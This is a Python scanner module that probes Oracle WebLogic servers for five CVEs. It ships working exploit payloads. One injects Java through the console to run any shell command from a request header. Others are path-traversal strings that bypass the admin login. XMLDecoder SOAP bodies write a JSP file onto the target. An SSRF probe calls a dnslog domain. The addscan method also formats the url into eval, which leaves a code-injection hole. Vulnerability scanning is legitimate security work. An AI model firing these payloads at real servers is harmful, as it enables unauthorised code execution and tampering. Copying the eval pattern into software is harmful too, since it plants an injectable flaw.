#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Weblogic扫描类: 
        Weblogic 管理控制台未授权远程命令执行
            CVE-2020-14882
        Weblogic 权限验证绕过漏洞
            CVE-2020-14750
        Weblogic wls9_async_response 反序列化漏洞
            CVE-2019-2725
        Weblogic 'wls-wsat' XMLDecoder 反序列化漏洞
            CVE-2017-10271
        Weblogic 服务端请求伪造 (SSRF)
            CVE-2014-4210
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep
import http.client

class Weblogic():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Weblogic'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2020_14882_payloads = [
            {
                'path': 'images/%252E./consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
                'data': ''
            },
            {
                'path': 'images/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
                'data': ''
            },
            {
                'path': 'console/images/%252E./consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
                'data': ''
            },
            {
                'path': 'console/images/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
                'data': ''
            }
        ]

        self.cve_2020_14750_payloads = [
            {
                'path': 'images/%252E./console.portal',
                'data': ''
            },
            {
                'path': 'images/%252e%252e%252fconsole.portal',
                'data': ''
            },
            {
                'path': 'css/%252E./console.portal',
                'data': ''
            },
            {
                'path': 'css/%252e%252e%252fconsole.portal',
                'data': ''
            },
            {
                'path': 'console/images/%252E./console.portal',
                'data': ''
            },
            {
                'path': 'console/images/%252e%252e%252fconsole.portal',
                'data': ''
            },
            {
                'path': 'console/css/%252E./console.portal',
                'data': ''
            },
            {
                'path': 'console/css/%252e%252e%252fconsole.portal',
                'data': ''
            }
        ]

        self.cve_2019_2725_payloads = [
            {
                'path': '_async/AsyncResponseService',
                'data': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/mouse.jsp</string><void method="println"><string><![CDATA[
<% out.println("CVE/2019/2725"); %>]]>
</string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'''
            }
        ]

        self.cve_2017_10271_payloads = [
            {
                'path': 'wls-wsat/CoordinatorPortType',
                'data': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
         <java version="1.6.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter"> 
                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/mouse.jsp</string><void method="println">
                        <string><![CDATA[<% out.println("<h1>CVE/2017/10271</h1>"); %>]]></string></void><void method="close"/>
                    </object>
            </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
</soapenv:Envelope>'''
            },
            {
                'path': 'wls-wsat/CoordinatorPortType',
                'data': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
         <java version="1.6.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter"> 
                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/9j4dqk/war/mouse.jsp</string><void method="println">
                        <string><![CDATA[<% out.println("<h1>CVE/2017/10271</h1>"); %>]]></string></void><void method="close"/>
                    </object>
            </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
</soapenv:Envelope>'''
            }
        ]

        self.cve_2014_4210_payloads = [
            {
                'path': 'uddiexplorer/SearchPublicRegistries.jsp?operator=http://dnsdomain/&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search',
                'data': ''
            }
        ]

    def cve_2020_14882_scan(self, url):
        ''' Weblogic 管理控制台未授权远程命令执行
                配合CVE-2020-14750未授权进入后台, 调用相关接口实现命令执行
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2020-14882'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {
            'cmd': self.cmd
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2020_14882_payloads:    # * Payload

            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                # * 有时候用HTTP1.1会报错, 使用HTTP1.0试试
                http.client.HTTPConnection._http_vsn = 10
                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                http.client.HTTPConnection._http_vsn = 11
                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'

                logger.logging(vul_info, res.status_code, res)                        # * LOG

            except requests.ConnectTimeout:
                http.client.HTTPConnection._http_vsn = 11
                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                http.client.HTTPConnection._http_vsn = 11
                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
                logger.logging(vul_info, 'Faild')
                return None
            except:
                http.client.HTTPConnection._http_vsn = 11
                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
                logger.logging(vul_info, 'Error')
                return None

            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': url + 'console/images/%252E./consolejndi.portal',
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Headers': vul_info['headers']
                    }
                }
                return results

    def cve_2020_14750_scan(self, url):
        ''' Weblogic 权限验证绕过漏洞
                可通过目录跳转符../回到上一级目录, 然后在../后面拼接console后台目录, 即可绕过后台登录, 直接进入后台
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unAuthorized'
        vul_info['vul_id'] = 'CVE-2020-14750'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cve_2020_14750_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res1 = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies,
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res1.status_code, res1)                        # * LOG

                if ((res1.status_code == 302) and ('Set-Cookie' in res1.headers)):
                    try:
                        cookie = {
                            'Cookie': res1.headers['Set-Cookie']
                        }
                        headers.update(cookie)
                    except KeyError:
                        continue

                    res2 = requests.get(
                        target, 
                        timeout=self.timeout, 
                        headers=headers, 
                        data=data, 
                        proxies=self.proxies, 
                        verify=False
                    )
                    logger.logging(vul_info, res2.status_code, res2)                        # * LOG
                else:
                    continue
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('管理控制台' in res2.text) or ('Information and Resources' in res2.text) or ('Overloaded' in res2.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2019_2725_scan(self, url):
        ''' Weblogic 
                部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogicServer提供异步通讯服务
                由于该WAR包在反序列化处理输入信息时存在缺陷, 在未授权的情况下可以远程执行命令
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unSerialization'
        vul_info['vul_id'] = 'CVE-2019-2725'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Content-Type': 'text/xml'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2019_2725_payloads:     # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (res.status_code == 202):
                sleep(3)                                        # * 延时, 因为命令执行生成文件可能有延迟, 要等一会判断结果才准确
                verify_url = url + '_async/mouse.jsp'
                verify_res = requests.get(
                        verify_url, 
                        timeout=self.timeout, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                logger.logging(vul_info, verify_res.status_code, verify_res)

                if ((verify_res.status_code == 200) and ('CVE/2019/2725' in verify_res.text)):
                    results = {
                        'Target': verify_url,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Payload': res
                    }
                    return results

    def cve_2017_10271_scan(self, url):
        ''' Weblogic 'wls-wsat' XMLDecoder 反序列化漏洞
                < 10.3.6
                Weblogic的WLS Security组件对外提供webservice服务, 其中使用了XMLDecoder来解析用户传入的XML数据, 在解析的过程中出现反序列化漏洞, 导致可执行任意命令
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unSerialization'
        vul_info['vul_id'] = 'CVE-2017-10271'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Content-Type': 'text/xml'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2017_10271_payloads:    # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (res.status_code == 500):
                sleep(3)                                        # * 延时, 因为命令执行生成文件可能有延迟, 要等一会判断结果才准确
                verify_url = url + 'wls-wsat/mouse.jsp'
                verify_res = requests.get(
                        verify_url, 
                        timeout=self.timeout, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                logger.logging(vul_info, verify_res.status_code, verify_res)

                if ((verify_res.status_code == 200) and ('CVE/2017/10271' in verify_res.text)):
                    results = {
                        'Target': verify_url,
                        'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                        'Payload': res
                    }
                    return results

    def cve_2014_4210_scan(self, url):
        ''' Weblogic uddiexplorer SSRF漏洞
                uddiexplorer组件的SearchPublicRegistries.jsp页面存在一个SSRF漏洞
        '''
        sessid = '0fe976335bbe903a97650f15dcb0ce47'
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SSRF'
        vul_info['vul_id'] = 'CVE-2014-4210'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers.copy()                               # * 复制一份headers, 防止污染全局headers
        headers.update(vul_info['headers'])                         # * 合并Headers

        for payload in self.cve_2014_4210_payloads:                 # * Payload
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path'].replace('dnsdomain', dns_domain) # * Path
            data = payload['data']                                  # * Data
            target = url + path                                     # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(3)                                                # * dns查询可能较慢, 等一会
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_14882_scan, url=url),
            thread(target=self.cve_2020_14750_scan, url=url),
            thread(target=self.cve_2019_2725_scan, url=url),
            thread(target=self.cve_2017_10271_scan, url=url),
            thread(target=self.cve_2014_4210_scan, url=url)
        ]

weblogic = Weblogic()